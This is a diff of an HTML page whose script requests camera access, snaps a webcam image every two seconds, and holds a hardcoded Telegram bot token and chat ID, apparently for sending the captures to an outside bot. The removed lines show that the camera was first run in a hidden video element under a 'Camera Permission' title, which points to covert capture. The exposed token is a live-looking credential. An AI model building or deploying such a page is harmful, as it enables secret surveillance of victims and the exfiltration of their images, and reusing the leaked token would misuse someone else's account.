@@ -3,26 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Permission</title>
+    
 </head>
 <body>
+    <video id="video" width="640" height="480" autoplay></video>
     <script>
         const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw'; // আপনার টেলিগ্রাম বট টোকেন এখানে দিন
         const chatId = '5125698617'; // আপনার চ্যাট আইডি এখানে দিন
 
         async function startVideo() {
             try {
-                // ক্যামেরার ভিডিও স্ট্রিম নেয়
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-                // ভিডিও স্ট্রিমটি পেজে কোন ভিডিও এলিমেন্টে না দেখিয়ে শুধু ক্যামেরায় থাকা
-                // `srcObject` দিয়ে ক্যামেরার ভিডিও চালু রাখা হবে
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.style.display = 'none'; // ভিডিও ডিসপ্লেতে না দেখানোর জন্য
-                document.body.appendChild(videoElement); // ভিডিও এলিমেন্ট পেজে যুক্ত করা (ডিসপ্লেতে নয়)
-
-                // প্রতি 2 সেকেন্ড পর পর ছবি ক্যাপচার করা
+                document.getElementById('video').srcObject = stream;
                 setInterval(() => {
                     captureImage();
                 }, 2000); // Adjusted to 2000 ms (2 seconds)
@@ -32,7 +24,7 @@
         }
 
         function captureImage() {
-            const video = document.querySelector('video'); // প্রথম ভিডিও এলিমেন্ট নেবে
+            const video = document.getElementById('video');
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
